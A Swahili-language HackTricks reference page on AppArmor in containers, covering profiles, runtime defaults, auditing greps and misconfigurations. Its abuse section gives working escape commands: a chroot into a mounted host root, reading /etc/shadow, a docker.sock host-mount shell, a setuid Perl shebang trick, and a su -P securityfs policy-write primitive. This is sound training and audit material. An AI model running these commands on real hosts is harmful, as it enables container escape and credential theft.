# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Mandatory Access Control** unaoweka vizuizi kupitia profaili za kila programu. Tofauti na ukaguzi wa kawaida wa DAC, ambao hutegemea sana umiliki wa mtumiaji na kikundi, AppArmor huiwezesha kernel kutekeleza sera inayohusishwa moja kwa moja na mchakato. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na ruhusa za kawaida za kutosha kujaribu kitendo fulani, lakini bado ikazuiwa kwa sababu profaili yake ya AppArmor hairuhusu njia husika, mount, tabia ya mtandao, au matumizi ya capability.

Jambo muhimu zaidi la kuelewa ni kwamba AppArmor ni **path-based**. Huchanganua ufikiaji wa mfumo wa faili kwa kutumia sheria za njia badala ya lebo kama SELinux. Hilo hufanya iwe rahisi kueleweka na yenye nguvu, lakini pia humaanisha kuwa bind mounts na mipangilio mbadala ya njia vinahitaji kuzingatiwa kwa makini. Ikiwa maudhui yale yale ya host yanaweza kufikiwa kupitia njia tofauti, athari ya sera huenda isiwe kama opereta alivyotarajia mwanzoni.

## Jukumu Katika Kutenga Container

Ukaguzi wa usalama wa container mara nyingi huishia kwenye capabilities na seccomp, lakini AppArmor bado ni muhimu baada ya ukaguzi huo. Fikiria container yenye ruhusa nyingi kuliko inavyopaswa kuwa, au workload iliyohitaji capability moja ya ziada kwa sababu za kiutendaji. AppArmor bado inaweza kuzuia ufikiaji wa faili, tabia ya mount, mitandao na mifumo ya utekelezaji kwa njia zinazozuia njia za wazi za matumizi mabaya. Ndiyo maana kuzima AppArmor “ili tu programu ifanye kazi” kunaweza kubadilisha kimyakimya usanidi ulio hatarishi tu kuwa ule unaoweza kutumiwa vibaya moja kwa moja.

## Maabara

Kuangalia kama AppArmor inatumika kwenye host, tumia:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Ili kuona mchakato wa sasa wa kontena unaendeshwa chini ya wasifu gani:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Tofauti hii inafundisha. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor unaohusishwa na wasifu uliochaguliwa na runtime. Katika hali isiyozuiliwa, safu hiyo ya ziada ya vizuizi hutoweka.

Unaweza pia kukagua kile ambacho Docker inadhani imetumia:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Matumizi Wakati wa Runtime

Docker inaweza kutumia wasifu chaguomsingi au maalum wa AppArmor ikiwa host inautumia. Podman pia inaweza kuunganishwa na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distros zinazotanguliza SELinux, mfumo mwingine wa MAC mara nyingi huwa muhimu zaidi. Kubernetes inaweza kuweka sera ya AppArmor katika kiwango cha workload kwenye nodi zinazotumia AppArmor. LXC na mazingira yanayohusiana ya system container ya familia ya Ubuntu pia hutumia AppArmor kwa kiwango kikubwa.

Jambo muhimu kiutendaji ni kwamba AppArmor si "kipengele cha Docker". Ni kipengele cha kernel ya host ambacho runtimes kadhaa zinaweza kuchagua kutumia. Ikiwa host haitumii AppArmor au runtime imewekwa kuendesha bila vizuizi, ulinzi unaodhaniwa haupo.

Kwa Kubernetes, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, annotations za zamani za AppArmor za beta zimepitwa na wakati. Kwenye host zinazotumika, `RuntimeDefault` ndiyo wasifu chaguomsingi, huku `Localhost` ikielekeza kwenye wasifu ambao lazima uwe tayari umepakiwa kwenye nodi. Hili ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kutumia AppArmor, ilhali bado inategemea kabisa usaidizi wa upande wa nodi na wasifu uliopakiwa awali.<sup>[[1]](#references)</sup>

Jambo moja la kiutendaji ambalo si dhahiri lakini lina manufaa ni kwamba kuweka `appArmorProfile.type: RuntimeDefault` waziwazi ni masharti magumu zaidi kuliko kuacha sehemu hiyo bila kuwekwa. Ikiwa sehemu hiyo imewekwa waziwazi na nodi haitumii AppArmor, admission inapaswa kushindwa. Ikiwa sehemu hiyo haijawekwa, workload bado inaweza kuendeshwa kwenye nodi isiyotumia AppArmor, bila kupata safu hiyo ya ziada ya vizuizi. Kwa mtazamo wa mshambuliaji, hii ni sababu nzuri ya kukagua manifest na hali halisi ya nodi.<sup>[[1]](#references)</sup>

Kwenye host za AppArmor zinazotumia Docker, wasifu chaguomsingi unaojulikana zaidi ni `docker-default`. Wasifu huo huzalishwa kutoka kwenye kiolezo cha AppArmor cha Moby, na ni muhimu kwa sababu unaeleza kwa nini baadhi ya PoCs zinazotegemea capabilities bado hushindwa kwenye container chaguomsingi. Kwa ujumla, `docker-default` huruhusu matumizi ya kawaida ya mtandao, hukataa uandishi kwenye sehemu kubwa ya `/proc`, hukataa ufikiaji wa sehemu nyeti za `/sys`, huzuia shughuli za mount, na huzuia ptrace ili isiwe njia ya jumla ya kuchunguza host. Kuelewa kiwango hicho cha msingi husaidia kutofautisha kati ya "container ina `CAP_SYS_ADMIN`" na "container inaweza kutumia capability hiyo dhidi ya interfaces za kernel ninazozijali".

## Usimamizi wa Wasifu

Wasifu wa AppArmor kwa kawaida huhifadhiwa katika `/etc/apparmor.d/`. Mfuatano wa kawaida wa majina ni kubadilisha mikwaju katika njia ya executable kuwa nukta. Kwa mfano, wasifu wa `/usr/bin/man` kwa kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Jambo hili ni muhimu wakati wa ulinzi na tathmini kwa sababu ukishajua jina la wasifu unaotumika, mara nyingi unaweza kupata faili inayohusika kwenye host kwa haraka.

Amri muhimu za usimamizi upande wa host ni pamoja na:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Sababu ya amri hizi kuwa muhimu katika marejeo ya usalama wa container ni kwamba zinaeleza jinsi profiles zinavyoundwa, kupakiwa, kubadilishwa kuwa complain mode, na kurekebishwa baada ya mabadiliko ya programu. Ikiwa operator ana tabia ya kubadilisha profiles kuwa complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, container inaweza kuonekana kuwa imelindwa kwenye nyaraka huku kiuhalisia ikifanya kazi kwa vizuizi vichache zaidi.

### Kuunda Na Kusasisha Profiles

`aa-genprof` inaweza kufuatilia tabia ya programu na kusaidia kuunda profile kwa njia shirikishi:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` inaweza kutengeneza wasifu wa kiolezo ambao unaweza kupakiwa baadaye kwa kutumia `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Wakati binary inapobadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena matukio ya kunyimwa yaliyopatikana kwenye logs na kumsaidia mwendeshaji kuamua kuyakubali au kuyakataa:

```bash
sudo aa-logprof
```

### Kumbukumbu

Kukataliwa kwa AppArmor mara nyingi huonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Hili ni muhimu kiutendaji na kwa mashambulizi. Watetezi hulitumia kuboresha profiles. Washambuliaji hulitumia kubaini njia au operesheni mahususi inayozuiwa, na kama AppArmor ndiyo udhibiti unaozuia msururu wa exploit.

### Kubaini Faili Halisi ya Profile

Runtime inapoonyesha jina mahususi la AppArmor profile kwa container, mara nyingi ni muhimu kulinganisha jina hilo na faili ya profile kwenye diski:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Hili ni muhimu hasa wakati wa ukaguzi kwenye host kwa sababu linaunganisha pengo kati ya “container inasema inaendeshwa chini ya profile `lowpriv`” na “sheria halisi ziko kwenye faili hii mahususi inayoweza kukaguliwa au kupakiwa upya”.

### Sheria Muhimu za Kukagua

Unapoweza kusoma profile, usiishie kwenye mistari rahisi ya `deny`. Aina kadhaa za sheria hubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyosaidia kuzuia jaribio la kutoroka kutoka kwenye container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: endesha binary lengwa bila vikwazo. Ikiwa helper, shell, au interpreter inayoweza kufikiwa inaruhusiwa chini ya `ux`, hilo kwa kawaida ndilo jambo la kwanza kujaribu.
- `px` / `Px` na `cx` / `Cx`: fanya mabadiliko ya profile wakati wa exec. Haya si mabaya moja kwa moja, lakini yanastahili kukaguliwa kwa sababu mabadiliko yanaweza kupeleka kwenye profile yenye ruhusa pana zaidi kuliko ya sasa.
- `change_profile`: huruhusu task kubadilisha na kutumia profile nyingine iliyopakiwa, mara moja au wakati wa exec inayofuata. Ikiwa profile lengwa ina vizuizi vichache zaidi, hii inaweza kuwa njia iliyokusudiwa ya kutoroka kutoka kwenye domain yenye vizuizi.
- `flags=(complain)`, `flags=(unconfined)`, au `flags=(prompt)` za matoleo mapya zaidi: hizi zinapaswa kubadilisha kiwango cha imani unachoweka kwenye profile. `complain` huweka kumbukumbu ya ukiukaji badala ya kuutekeleza, `unconfined` huondoa mpaka wa usalama, na `prompt` hutegemea njia ya uamuzi ya userspace badala ya kukataliwa kunakotekelezwa na kernel pekee.
- `userns` au `userns create,`: sera mpya zaidi za AppArmor zinaweza kudhibiti uundaji wa user namespaces. Ikiwa profile ya container inaruhusu hili waziwazi, user namespaces zilizowekwa ndani bado zinaweza kutumika hata kama jukwaa linatumia AppArmor kama sehemu ya mkakati wake wa kuimarisha usalama.

Grep muhimu ya host-side:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Aina hii ya ukaguzi mara nyingi huwa na manufaa zaidi kuliko kukagua mamia ya sheria za kawaida za faili. Ikiwa breakout inategemea kutekeleza helper, kuingia kwenye namespace mpya, au kutoroka na kuingia kwenye profile yenye vizuizi vichache zaidi, jibu mara nyingi hufichwa kwenye sheria hizi zinazohusu mabadiliko badala ya mistari iliyo wazi kama `deny /etc/shadow r`.

## Mipangilio Isiyo Sahihi

Kosa lililo wazi zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi huweka mpangilio huu wanapotatua hitilafu ya programu iliyotokea kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa bendera hii itabaki kwenye production, safu nzima ya MAC huwa imeondolewa.

Tatizo jingine lisilo dhahiri sana ni kudhani kuwa bind mounts hazina madhara kwa sababu ruhusa za faili zinaonekana za kawaida. Kwa kuwa AppArmor hutegemea path, kufichua host paths kwenye maeneo mbadala ya mount kunaweza kusababisha matatizo katika mwingiliano na sheria za path. Kosa la tatu ni kusahau kuwa jina la profile kwenye faili ya usanidi halina maana kubwa ikiwa kernel ya host hailazimishi AppArmor kwa kweli.

## Matumizi Mabaya

AppArmor ikiondolewa, shughuli zilizokuwa zimewekewa vizuizi zinaweza kuanza kufanikiwa ghafla: kusoma path nyeti kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kubaki ngumu zaidi kutumia, kufanya shughuli zinazohusiana na mount ikiwa capabilities/seccomp pia zinaruhusu, au kutumia path ambazo profile kwa kawaida ingekataa. AppArmor mara nyingi ndiyo hueleza kwa nini jaribio la breakout linalotegemea capability "linapaswa kufanya kazi" kinadharia lakini bado hushindwa kiutendaji. Ondoa AppArmor, na jaribio hilo hilo linaweza kuanza kufanikiwa.

Ikiwa unashuku kuwa AppArmor ndiyo hasa inayozuia mnyororo wa matumizi mabaya unaotegemea path-traversal, bind-mount, au mount, hatua ya kwanza kwa kawaida ni kulinganisha vitu vinavyoweza kufikiwa wakati profile imewashwa na wakati imezimwa. Kwa mfano, ikiwa host path imewekwa ndani ya container, anza kwa kuangalia kama unaweza kuipitia na kuisoma:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio ya vitendo zaidi ni kubaini kama AppArmor ndiyo inayozuia shughuli za mount au ufikiaji wa filesystems nyeti za kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Katika mazingira ambapo njia ya host tayari inapatikana kupitia bind mount, kupotea kwa AppArmor kunaweza pia kubadilisha suala la ufichuaji wa taarifa la kusoma tu kuwa ufikiaji wa moja kwa moja wa faili za host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Lengo la amri hizi si kwamba AppArmor pekee ndiyo husababisha breakout. Ni kwamba AppArmor ikiondolewa, njia nyingi za matumizi mabaya zinazotegemea mfumo wa faili na mount zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Imezimwa + Root ya Host Ime-mountiwa

Ikiwa root ya host tayari imeunganishwa kwa bind mount kwenye `/host` ndani ya container, kuondoa AppArmor kunaweza kubadilisha njia ya matumizi mabaya ya mfumo wa faili iliyokuwa imezuiwa na kuwa njia kamili ya kutoroka host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Mara tu shell inapoendeshwa kupitia mfumo wa faili wa host, workload kwa hakika inakuwa imevuka mpaka wa container:

```bash
id
hostname
cat /etc/shadow | head
```

### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi halisi kilikuwa AppArmor inayolinda hali ya runtime, socket iliyomountiwa inaweza kutosha kufanikisha escape kamili:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Njia halisi hutegemea sehemu ya mount, lakini matokeo ni yale yale: AppArmor haizuii tena ufikiaji wa runtime API, na runtime API inaweza kuwasha container inayoweza kuhatarisha host.

### Mfano Kamili: Kukwepa Bind-Mount kwa Kutumia Njia

Kwa kuwa AppArmor hutegemea njia, kulinda `/proc/**` hakulindi kiotomatiki maudhui yale yale ya host procfs yanapofikiwa kupitia njia tofauti:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Athari hutegemea kile hasa kilichowekwa kwenye mount na kama njia mbadala pia inapita vidhibiti vingine, lakini muundo huu ni mojawapo ya sababu zilizo wazi zaidi kwa nini AppArmor lazima itathminiwe pamoja na mpangilio wa mount, badala ya kutathminiwa pekee.

### Mfano Kamili: Kuepuka Shebang

AppArmor inaweza kuhusisha profile na path ya script inayotekelezwa badala ya interpreter iliyotajwa kwenye shebang yake. Kinyume chake, kumwita interpreter moja kwa moja kunaweza kuchagua profile ya interpreter. [Msimamizi wa AppArmor anaeleza tofauti hii](https://bugs.launchpad.net/apparmor/+bug/1911431). Mfano wa kihistoria ulihusisha script ambayo mstari wake wa kwanza unaelekeza kwa interpreter iliyowekewa vikwazo:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Mfano huu ni hali inayowezekana tu ambapo uwezo wa file wa interpreter unaweza kutumika, na exec attachment halisi ya script inaruhusu operesheni hiyo. Kagua policy iliyopakiwa na process label, capability bounding set, `no_new_privs`, na hali ya `nosuid` ya mount; jina la profile file au orodha ya `cap_setuid+ep` pekee haithibitishi kuwa transition inaweza kutumika. Mfuatano wa interpreter na njia mbadala za utekelezaji zinapaswa kukaguliwa kando.

## Faili za udhibiti wa policy kama primitive ya uandishi yenye privileged access

Kwenye kernels za AppArmor zilizoathiriwa, mtumiaji asiye na privileged access anaweza kufungua faili za securityfs `.load`, `.replace`, au `.remove` kwa ajili ya kuandika, lakini `write()` ya moja kwa moja hushindwa kwa sababu ruhusa ya policy-admin hukaguliwa wakati wa kuandika. Ikiwa helper ya setuid inarithi descriptor hiyo kama stdout au stderr na kuandika bytes zinazodhibitiwa na mshambuliaji, kernel hutumia credentials za helper. Hii humfanya helper kuwa *mwandishi wa data ya policy mwenye privileged access*, si njia ya kumpa caller root kwa ujumla. Qualys ilionyesha kuwa `su -P` inaweza kupeleka bytes kutoka kwa command inayoendeshwa kama mtumiaji huyo huyo kupitia njia yake ya privileged PTY; njia hiyo inahitaji nenosiri lililowekwa kwa akaunti ya mtumiaji. Kagua kernel iliyosakinishwa na marekebisho ya `su` badala ya kuchukulia ruhusa ya faili inayoruhusu uandishi kwa kila mtu kuwa uthibitisho wa uwezekano wa kushambuliwa.<sup>[[3]](#references)[[4]](#references)</sup>

Katika lab ya muda yenye kernel na helper zilizoathiriwa, hii huunda na kisha kuondoa profile ya majaribio. Shell hufungua kila control file kabla `su` haijaandika humo; `stty raw` huzuia PTY relay kubadilisha bytes za profile iliyokusanywa. Usifanye jaribio hili dhidi ya profile ya production.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Primitive hiyo hiyo inaweza kuchukua nafasi ya profile iliyopo. Kwa mfano, profile inayoruhusu `userns` kwa launcher inaweza kuondoa kizuizi cha AppArmor cha user namespace, lakini haitoi capabilities za host-root; sysctls halisi za namespace na vidhibiti vingine bado ni muhimu. Inaweza pia kuondoa confinement kwenye mchakato lengwa. Kagua [kernel exposure checks](../../../main-system-information/kernel-vulnerability-assessment.md) na [muhtasari wa Linux Hardening](../../../) kwa mtiririko mpana wa privilege escalation.<sup>[[3]](#references)[[4]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi huu ni kujibu maswali matatu kwa haraka: je, AppArmor imewezeshwa kwenye host, je, mchakato wa sasa umewekewa confinement, na je, runtime imetumia profile kwenye container hii?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ni nini kinachovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haipati ulinzi wa AppArmor.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile kwenye runtime config kwa kiasi kikubwa ni la mapambo tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au profile maalum usiyoitarajia, mara nyingi hiyo ndiyo sababu njia ya matumizi mabaya inayotegemea filesystem au mount inafanya kazi.
- Ikiwa `/sys/kernel/security/apparmor/profiles` haina profile uliyotarajia, runtime au usanidi wa orchestrator pekee hautoshi.
- Ikiwa profile inayodaiwa kuwa hardened ina sheria za aina ya `ux`, `change_profile` pana, `userns`, au `flags=(complain)`, mpaka halisi wa usalama unaweza kuwa dhaifu zaidi kuliko jina la profile linavyoashiria.

Ikiwa container tayari ina privileges zilizoinuliwa kwa sababu za kiutendaji, kuacha AppArmor ikiwa imewezeshwa mara nyingi ndiko kunakotofautisha exception inayodhibitiwa na hitilafu kubwa zaidi ya usalama.

## Chaguomsingi za Runtime

| Runtime / platform | Hali chaguomsingi | Tabia chaguomsingi | Njia za kawaida za kudhoofisha kwa mikono |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguomsingi kwenye hosts zinazotumia AppArmor | Hutumia profile ya AppArmor ya `docker-default` isipobatilishwa | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hutegemea host | AppArmor inatumika kupitia `--security-opt`, lakini chaguomsingi halisi hutegemea host/runtime na si la kawaida kwa wote kama profile ya `docker-default` iliyoandikwa kwenye nyaraka za Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Chaguomsingi la masharti | Ikiwa `appArmorProfile.type` haijabainishwa, chaguomsingi ni `RuntimeDefault`, lakini hutumika tu ikiwa AppArmor imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` yenye profile dhaifu, nodes zisizotumia AppArmor |
| containerd / CRI-O chini ya Kubernetes | Hufuata uwezo wa node/runtime | Runtimes zinazotumiwa kwa kawaida na Kubernetes hutumia AppArmor, lakini utekelezaji halisi bado hutegemea uwezo wa node na mipangilio ya workload | Sawa na safu ya Kubernetes; usanidi wa moja kwa moja wa runtime unaweza pia kuruka AppArmor kabisa |

Kwa AppArmor, kigezo muhimu zaidi mara nyingi ni **host**, si runtime pekee. Mipangilio ya profile kwenye manifest haiundi ulinzi kwenye node ambayo AppArmor haijawezeshwa.



## References

- [1] [Muktadha wa usalama wa Kubernetes: sehemu za profile za AppArmor na tabia ya usaidizi wa node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ukurasa wa man(5) wa Ubuntu 24.04 `apparmor.d(5)`: mabadiliko ya exec, `change_profile`, `userns`, na alama za profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Ilani ya kiufundi ya Qualys CrackArmor](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Msingi wa maarifa wa Ubuntu kuhusu udhaifu wa CrackArmor](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
